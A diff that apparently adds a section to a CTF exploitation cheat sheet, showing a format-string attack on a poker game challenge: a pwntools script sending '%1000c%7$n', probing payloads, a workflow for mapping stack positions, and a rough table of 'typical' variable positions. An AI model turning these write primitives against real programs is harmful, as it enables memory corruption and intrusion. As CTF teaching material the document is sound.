@@ -8,6 +8,7 @@
 - [Format String Canary + PIE Leak](#format-string-canary-pie-leak)
 - [__free_hook Overwrite via Format String (glibc < 2.34)](#__free_hook-overwrite-via-format-string-glibc-234)
 - [.rela.plt / .dynsym Patching](#relaplt-dynsym-patching)
+- [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
 
 ---
 
@@ -243,3 +244,44 @@ STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword
 ```
 
 **When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.
+
+---
+
+## Format String for Game State Manipulation (UTCTF 2026)
+
+**Pattern (Small Blind):** Poker/card game where player name is vulnerable to format string. Stack contains pointers to game state variables (player chips, dealer chips). Write arbitrary values to win condition.
+
+**Key insight:** `%n` writes the number of characters printed so far. Use `%Xc` to control that count, then `%N$n` to write to the Nth stack argument (which points to a game variable).
+
+**Exploitation:**
+```python
+from pwn import *
+
+p = remote('challenge.utctf.live', 7255)
+p.recvuntil(b'Enter your name: ')
+
+# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
+# Stack position 7 = pointer to player_chips variable
+p.sendline(b'%1000c%7$n')
+
+# Player now has 1000 chips → triggers win condition
+# Collect flag from game output
+```
+
+**Discovery workflow:**
+1. **Confirm format string:** Send `%p.%p.%p.%p` as name, check for hex leaks
+2. **Map stack positions:** Try `%6$n`, `%7$n`, `%8$n` with different `%Xc` values
+3. **Identify which variable changed:** Compare game output (chips, score, health) before/after
+4. **Determine win condition:** May be `player_chips >= threshold` or `player > dealer`
+5. **Craft winning payload:** Set player chips high (`%9999c%7$n`) or dealer chips to 0 (`%6$n`)
+
+**Common game state patterns on stack:**
+| Position | Typical Variable |
+|----------|-----------------|
+| 6 | Pointer to dealer/opponent state |
+| 7 | Pointer to player state |
+| 8-10 | Score, health, inventory |
+
+**When `%n` writes to adjacent variables:** If player and dealer chips are adjacent in memory (4 bytes apart), positions N and N+1 point to them. Write 0 to dealer (`%N$n` with 0 chars printed) and high value to player (`%9999c%(N+1)$n`).
+
+**Key insight:** Format string vulnerabilities in game binaries are simpler than typical pwn — you don't need shell, just manipulate game state to trigger the win condition. Map stack positions to game variables, then write the winning values.
